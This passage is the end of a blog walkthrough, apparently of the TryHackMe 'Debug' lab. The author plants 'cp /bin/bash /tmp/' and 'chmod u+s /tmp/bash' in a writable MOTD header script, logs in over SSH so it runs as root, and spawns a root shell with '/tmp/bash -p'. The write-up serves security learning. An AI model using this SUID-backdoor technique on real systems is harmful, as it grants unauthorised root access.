<span style="color:#75715e">#    but WITHOUT ANY WARRANTY; without even the implied warranty of</span>
<span style="color:#75715e">#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span>
<span style="color:#75715e">#    GNU General Public License for more details.</span>
<span style="color:#75715e">#</span>
<span style="color:#75715e">#    You should have received a copy of the GNU General Public License along</span>
<span style="color:#75715e">#    with this program; if not, write to the Free Software Foundation, Inc.,</span>
<span style="color:#75715e">#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span>

<span style="color:#f92672">[</span> -r /etc/lsb-release <span style="color:#f92672">]</span> <span style="color:#f92672">&amp;&amp;</span> . /etc/lsb-release

<span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> -z <span style="color:#e6db74">&#34;</span>$DISTRIB_DESCRIPTION<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">]</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">[</span> -x /usr/bin/lsb_release <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
        <span style="color:#75715e"># Fall back to using the very slow lsb_release utility</span>
        DISTRIB_DESCRIPTION<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>lsb_release -s -d<span style="color:#66d9ef">)</span>
<span style="color:#66d9ef">fi</span>

printf <span style="color:#e6db74">&#34;Welcome to %s (%s %s %s)\n&#34;</span> <span style="color:#e6db74">&#34;</span>$DISTRIB_DESCRIPTION<span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>uname -o<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>uname -r<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>uname -m<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
</code></pre></div><p>Alright, seems like simple bash commands, let&rsquo;s just copy <code>bash</code> to <code>tmp</code> and set root&rsquo;s SUID bit on it and see if that works.</p>
<p>Added the instructions in 3-4 lines.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">james@osboxes:/etc/update-motd.d$ cat 00-header
<span style="color:#75715e">#!/bin/sh</span>

cp /bin/bash /tmp/
chmod u+s /tmp/bash

<span style="color:#75715e">#</span>
<span style="color:#75715e">#    00-header - create the header of the MOTD</span>
<span style="color:#75715e">#    Copyright (C) 2009-2010 Canonical Ltd.</span>
<span style="color:#75715e">#</span>
<span style="color:#75715e">#    Authors: Dustin Kirkland &lt;kirkland@canonical.com&gt;</span>
<span style="color:#75715e">#</span>
<span style="color:#75715e">#    This program is free software; you can redistribute it and/or modify</span>
<span style="color:#75715e">#    it under the terms of the GNU General Public License as published by</span>
<span style="color:#75715e">#    the Free Software Foundation; either version 2 of the License, or</span>
<span style="color:#75715e">#    (at your option) any later version.</span>
<span style="color:#75715e">#</span>
<span style="color:#75715e">#    This program is distributed in the hope that it will be useful,</span>
<span style="color:#75715e">#    but WITHOUT ANY WARRANTY; without even the implied warranty of</span>
<span style="color:#75715e">#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span>
<span style="color:#75715e">#    GNU General Public License for more details.</span>
<span style="color:#75715e">#</span>
<span style="color:#75715e">#    You should have received a copy of the GNU General Public License along</span>
<span style="color:#75715e">#    with this program; if not, write to the Free Software Foundation, Inc.,</span>
<span style="color:#75715e">#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span>

<span style="color:#f92672">[</span> -r /etc/lsb-release <span style="color:#f92672">]</span> <span style="color:#f92672">&amp;&amp;</span> . /etc/lsb-release

<span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> -z <span style="color:#e6db74">&#34;</span>$DISTRIB_DESCRIPTION<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">]</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">[</span> -x /usr/bin/lsb_release <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
        <span style="color:#75715e"># Fall back to using the very slow lsb_release utility</span>
        DISTRIB_DESCRIPTION<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>lsb_release -s -d<span style="color:#66d9ef">)</span>
<span style="color:#66d9ef">fi</span>

printf <span style="color:#e6db74">&#34;Welcome to %s (%s %s %s)\n&#34;</span> <span style="color:#e6db74">&#34;</span>$DISTRIB_DESCRIPTION<span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>uname -o<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>uname -r<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>uname -m<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
</code></pre></div><p>But how does this execute? Is there a cron? don&rsquo;t think so.</p>
<p>Since, the .bash_history shows we need to ssh for the instructions to execute, let&rsquo;s try and SSH as james.</p>
<p><img src="/img/debug-thm/Pasted%20image%2020210403150745.png" alt=""></p>
<h3 id="root">Root!</h3>
<p>Cool, we&rsquo;ve got SUID bit of root user on the bash file, let&rsquo;s get root! :)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">james@osboxes:~$ /tmp/bash  -p
bash-4.3# id
uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>james<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>james<span style="color:#f92672">)</span> euid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>james<span style="color:#f92672">)</span>
bash-4.3# cd /root
bash-4.3# ls -al 
total <span style="color:#ae81ff">48</span>
drwx------  <span style="color:#ae81ff">7</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">10</span> 18:36 .
drwxr-xr-x <span style="color:#ae81ff">24</span> root root <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2019</span> ..
-rw-------  <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1257</span> Mar <span style="color:#ae81ff">10</span> 18:38 .bash_history
-rw-r--r--  <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">3106</span> Oct <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2015</span> .bashrc
drwxr-xr-x  <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Mar  <span style="color:#ae81ff">9</span> 20:01 .bundle
drwx------  <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">10</span> 18:36 .cache
drwxr-xr-x  <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Mar  <span style="color:#ae81ff">9</span> 20:00 .gem
drwxr-xr-x  <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">10</span> 18:35 .nano
-rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">148</span> Aug <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2015</span> .profile
-rw-r--r--  <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">33</span> Mar  <span style="color:#ae81ff">9</span> 20:56 root.txt
drwx------  <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Mar  <span style="color:#ae81ff">9</span> 20:55 .ssh
-rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">211</span> Mar  <span style="color:#ae81ff">9</span> 19:59 .wget-hsts
bash-4.3# 
bash-4.3# 
</code></pre></div><p>The flag is of the characters what we need!</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bash-4.3# wc -c root.txt 
<span style="color:#ae81ff">33</span> root.txt
bash-4.3# id
uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>james<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>james<span style="color:#f92672">)</span> euid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>james<span style="color:#f92672">)</span>
bash-4.3# uname -a 
Linux osboxes 4.15.0-45-generic <span style="color:#75715e">#48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span>
</code></pre></div><hr>
<p>Thanks for reading the walkthrough, hopefully you enjoyed it. I think maybe I was too verbose while writing it :P</p>

    </div>
    
      
        <div class="pagination">
          <div class="pagination__title">
            <span class="pagination__title-h">Read other posts</span>
            <hr />
          </div>
          <div class="pagination__buttons">
            
              <span class="button previous">
                <a href="https://umar0x01.sh/post/internal-thm/">
                  <span class="button__icon">â†</span>
                  <span class="button__text">Internal - TryHackMe - THM Walkthrough</span>
                </a>
              </span>
            
            
              <span class="button next">
                <a href="https://umar0x01.sh/post/suid-enumeration/">
                  <span class="button__text">SUID Enumeration/Exploitation - The Automated Way!</span>
                  <span class="button__icon">â†’</span>
                </a>
              </span>
            
          </div>
        </div>
      
    


    
      
        <div id="disqus_thread"></div>
<script type="application/javascript">
    var disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "umar0x01" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
      
    

    
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
	ga('create', 'UA-177361132-1', 'auto');
	
	ga('send', 'pageview');
}
</script>

    </div>

      </div>

      
        <footer class="footer">
  <div class="footer__inner">
    
      <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
</svg>
</span>
    <span class="logo__text">$ cd /home/umar_0x01/</span>
    <span class="logo__cursor"></span>
  
</a>

      <div class="copyright">
        <span>Â© 2021 <a href="https://github.com/Anon-Exploiter" target="_blank" rel="noopener">Umar_0x01</a></span>
        <span> twitter<a href="https://twitter.com/syed__umar" target="_blank" rel="noopener">@syed__umar</a>&nbsp;</span>
        <span> <a href="https://umar0x01.sh/archive" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
      </div>
    
  </div>
</footer>
<script src="https://umar0x01.sh/assets/main.js"></script>
<script src="https://umar0x01.sh/assets/prism.js"></script>








      
    </div>

    
      
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
	ga('create', 'UA-177361132-1', 'auto');
	
	ga('send', 'pageview');
}
</script>
    
  </body>
</html>
